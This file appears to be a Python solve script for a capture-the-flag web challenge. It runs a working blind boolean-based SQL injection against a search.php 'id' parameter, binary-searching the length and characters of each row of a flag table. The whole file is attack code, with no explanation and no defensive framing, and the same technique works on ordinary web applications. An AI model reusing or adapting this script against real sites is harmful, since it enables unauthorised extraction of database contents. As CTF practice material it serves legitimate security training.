#!/usr/bin/env python3
"""Extract all rows from Flaaaaag table"""
import urllib.request
BASE = "https://f4e3f42b4687b3d9401c897d.http-ctf2.dasctf.com/search.php"
def oracle(cond):
    url = f"{BASE}?id=2-({cond})"
    try:
        resp = urllib.request.urlopen(url, timeout=10).read().decode('utf-8','ignore')
        return 'NO! Not this!' in resp
    except:
        return False

# Extract each row individually and concatenate
for rid in range(1, 7):
    sq = f"(select(fl4gawsl)from(Flaaaaag)where(id)={rid})"
    # Get length
    lo, hi = 0, 200
    while lo < hi:
        mid = (lo + hi + 1) // 2
        if oracle(f"length({sq})>={mid}"):
            lo = mid
        else:
            hi = mid - 1
    length = lo
    print(f"\n[Row {rid}] length={length}")
    if length == 0:
        continue
    # Extract normally
    result = ""
    for pos in range(1, length + 1):
        lo_c, hi_c = 32, 126
        while lo_c < hi_c:
            mid = (lo_c + hi_c + 1) // 2
            if oracle(f"ord(substr({sq},{pos},1))>={mid}"):
                lo_c = mid
            else:
                hi_c = mid - 1
        c = chr(lo_c)
        result += c
        if pos % 20 == 0:
            print(f"  [{pos}/{length}] {result}")
    print(f"  [DONE] Row {rid}: {result}")
